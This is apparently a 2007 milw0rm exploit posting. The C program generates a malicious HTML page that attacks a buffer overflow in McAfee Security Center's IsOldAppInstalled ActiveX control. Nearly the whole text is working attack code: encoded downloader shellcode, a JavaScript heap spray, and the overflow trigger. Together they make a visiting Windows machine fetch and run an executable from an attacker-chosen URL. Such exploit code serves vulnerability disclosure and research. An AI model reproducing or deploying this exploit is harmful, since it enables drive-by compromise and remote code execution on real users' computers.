<html><head><title>McAfee Security Center IsOldAppInstalled ActiveX BoF Exploit</title></head><pre>/*
	McAfee Security Center IsOldAppInstalled ActiveX Buffer Overflow Vulnerability
	
	Peel the frame from axis,Thanks
	
	Test on Windows2000 and dll version Mcsubmgr.dll 6.0.0.15

	Greetz to OYXin, sowhat, Winny Thomas and 0x557 team
*/

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

FILE *fp = NULL;
char *file = &quot;McAfee_exploit.html&quot;;
char *url = NULL;

//Downloader shellcode
unsigned char sc[] = 
&quot;\xEB\x10\x5B\x4B\x33\xC9\x66\xB9\x3c\x01\x80\x34\x0B\x99\xE2\xFA&quot;
&quot;\xEB\x05\xE8\xEB\xFF\xFF\xFF\x70\x34\x99\x99\x99\xC3\x12\x6B\xAA&quot;
&quot;\x59\x35\xA4\x01\x99\x99\x99\xEC\x6F\x18\x75\x51\x99\x99\x99\x12&quot;
&quot;\x6D\x10\xCF\xBD\x71\x0C\x99\x99\x99\xAA\x42\x10\x9F\x66\xAF\xF1&quot;
&quot;\x17\xD7\x97\x75\x71\x34\x99\x99\x99\x10\xDF\x91\xF1\xF5\xF5\x99&quot;
&quot;\x99\xF1\xF6\xF7\xB7\xFD\xF1\xEC\xEB\xF5\xF4\xCD\x66\xCF\x91\x10&quot;
&quot;\xDF\x9D\x66\xAF\xF1\xE7\x41\x7B\xEA\x71\x11\x99\x99\x99\x10\xDF&quot;
&quot;\x95\x66\xAF\xF1\x01\x67\x13\x97\x71\xE0\x99\x99\x99\x10\xDF\x8D&quot;
&quot;\x66\xAF\xF1\xBC\x29\x66\x5B\x71\xF3\x99\x99\x99\x10\xDF\x81\x66&quot;
&quot;\xEF\x9D\xF1\xAF\x83\xB6\xE9\x71\xC3\x99\x99\x99\x10\xDF\x89\xF3&quot;
&quot;\xFC\xF1\xEA\xB7\xFC\xE1\x10\xFF\x85\x66\xEF\x85\x66\xCF\x81\xAA&quot;
&quot;\x50\xC8\xC8\x66\xEF\x85\x66\xEF\xBD\xC8\x66\xCF\x89\xAA\x50\xC8&quot;
&quot;\x66\xEF\x85\x66\xCF\x8D\x66\xCF\x95\x70\x19\x99\x99\x99\xCC\xCF&quot;
&quot;\xFD\x38\xA9\x99\x99\x99\x1C\x59\xE1\x95\x12\xD9\x95\x12\xE9\x85&quot;
&quot;\x34\x12\xF1\x91\x72\x90\x12\xD9\xAD\x12\x31\x21\x99\x99\x99\x12&quot;
&quot;\x5C\xC7\xC4\x5B\x9D\x99\xCA\xCC\xCF\xCE\x12\xF5\xBD\x81\x12\xDC&quot;
&quot;\xA5\x12\xCD\x9C\xE1\x9A\x4C\x12\xD3\x81\x12\xC3\xB9\x9A\x44\x7A&quot;
&quot;\xAB\xD0\x12\xAD\x12\x9A\x6C\xAA\x66\x65\xAA\x59\x35\xA3\x5D\xED&quot;
&quot;\x9E\x58\x56\x94\x9A\x61\x72\x6B\xA2\xE5\xBD\x8D\xEC\x78\x12\xC3&quot;
&quot;\xBD\x9A\x44\xFF\x12\x95\xD2\x12\xC3\x85\x9A\x44\x12\x9D\x12\x9A&quot;
&quot;\x5C\x72\x9B\xAA\x59\x12\x4C\xC6\xC7\xC4\xC2\x5B\x9D\x99\x71\x50&quot;
&quot;\x67\x66\x66&quot;;
unsigned char sc_2[] = &quot;\x98&quot;;

char * header =
&quot;&lt;!-- McAfee exploit:) Jambalaya--&gt;\n\n&quot;

&quot;&lt;html&gt;\n&quot;
&quot;&lt;object classid=\&quot;clsid:9BE8D7B2-329C-442A-A4AC-ABA9D7572602\&quot; id='target'&gt;&lt;/object&gt;\n&quot;
&quot;&lt;body&gt;\n&quot;
&quot;&lt;SCRIPT language=\&quot;javascript\&quot;&gt;\n&quot;
&quot;\tvar heapSprayToAddress = 0x05050505;\n&quot;
&quot;\tvar shellcode = unescape(\&quot;%u9090\&quot;+\&quot;%u9090\&quot;+ \n&quot;;




char * footer =
&quot;\n&quot;
&quot;var heapBlockSize = 0x400000;\n&quot; 
&quot;var payLoadSize = shellcode.length * 2;\n&quot;
&quot;var spraySlideSize = heapBlockSize - (payLoadSize+0x38);\n&quot;
&quot;var spraySlide = unescape(\&quot;%u0505%u0505\&quot;);\n&quot;
&quot;spraySlide = getSpraySlide(spraySlide,spraySlideSize);\n&quot;
&quot;heapBlocks = (heapSprayToAddress - 0x400000)/heapBlockSize;\n&quot;
&quot;memory = new Array();\n\n&quot;
&quot;for (i=0;i&lt;heapBlocks;i++)\n{\n&quot;
&quot;\t\tmemory[i] = spraySlide + shellcode;\n}\n&quot;

&quot;var padding = String.fromCharCode(0x05);\n&quot;
&quot;while( padding.length&lt; 500)\n&quot;
&quot;{\npadding +=padding;\n}\n&quot;
&quot;var str = padding.substring(0,500);\n&quot;
&quot;var arg2=\&quot;defaultV\&quot;;\n&quot;
&quot;target.IsOldAppInstalled(str, arg2);\n&quot; 

&quot;function getSpraySlide(spraySlide, spraySlideSize)\n{\n\t&quot;
&quot;while (spraySlide.length*2&lt;spraySlideSize)\n\t&quot;
&quot;{\n\t\tspraySlide += spraySlide;\n\t}\n&quot;
&quot;\tspraySlide = spraySlide.substring(0,spraySlideSize/2);\n\treturn spraySlide;\n}\n\n&quot;
&quot;&lt;/script&gt;\n&quot;;



char * trigger_1 =
&quot;&lt;/body&gt;\n&quot;
&quot;&lt;/html&gt;\n&quot;;


// print unicode shellcode
void PrintPayLoad(char *lpBuff, int buffsize)
{
int i;
for(i=0;i&lt;buffsize;i+=2)
{
if((i%16)==0)
{
if(i!=0)
{
printf(&quot;\&quot;\n\&quot;&quot;);
fprintf(fp, &quot;%s&quot;, &quot;\&quot; +\n\&quot;&quot;);
}
else
{
printf(&quot;\&quot;&quot;);
fprintf(fp, &quot;%s&quot;, &quot;\&quot;&quot;);
}
}

printf(&quot;%%u%0.4x&quot;,((unsigned short*)lpBuff)[i/2]);

fprintf(fp, &quot;%%u%0.4x&quot;,((unsigned short*)lpBuff)[i/2]);
}

printf(&quot;\&quot;;\n&quot;);
fprintf(fp, &quot;%s&quot;, &quot;\&quot;);\n&quot;); 


fflush(fp);
}




void main(int argc, char **argv)
{
unsigned char buf[1024] = {0};

int sc_len = 0;
int n;


if (argc &lt; 2)
{
	printf(&quot;#######################################\n&quot;);
	printf(&quot;#\tMcAfee Security Center IsOldAppInstalled exploit by Jambalaya:&gt;\n&quot;);
	printf(&quot;#\ttest on Windows2000 and dll version Mcsubmgr.dll 6.0.0.15:&gt;\n&quot;);
	printf(&quot;#\tReference : http://lists.grok.org.uk/pipermail/full-disclosure/2007-May/054183.html\n&quot;);
	printf(&quot;#\t100%% successful\? who knows\;\)\n&quot;);
	printf(&quot;\r\nUsage: %s &lt;URL&gt; [htmlfile]\n&quot;, argv[0]);
	printf(&quot;\r\nE.g.: %s http://www.fakename.com/hello.exe exploit.html\r\n\n&quot;, argv[0]);
exit(1);
}

url = argv[1];


if( (!strstr(url, &quot;http://&quot;) &amp;&amp; !strstr(url, &quot;ftp://&quot;)) || strlen(url) &lt; 10)
{
printf(&quot;[-] Invalid url. Must start with 'http://','ftp://'\n&quot;);
return; 
}

printf(&quot;[+] download url:%s\n&quot;, url);

if(argc &gt;=3) file = argv[2];
printf(&quot;[+] exploit file:%s\n&quot;, file);

fp = fopen(file, &quot;w&quot;);
if(!fp)
{
printf(&quot;[-] Open file error!\n&quot;);
return;
} 


//build evil html file
fprintf(fp, &quot;%s&quot;, header);
fflush(fp);

memset(buf, 0, sizeof(buf));
sc_len = sizeof(sc)-1;
memcpy(buf, sc, sc_len);
memcpy(buf+sc_len, url, strlen(url));

sc_len += strlen(url);

memcpy(buf+sc_len, sc_2, 1);
sc_len += 1;

PrintPayLoad((char *)buf, sc_len);

fprintf(fp, &quot;%s&quot;, footer);
fflush(fp); 

fprintf(fp, &quot;%s&quot;, trigger_1);
fflush(fp); 


printf(&quot;[+] exploit write to %s success!\n&quot;, file);
}

// milw0rm.com [2007-05-10]</pre></html>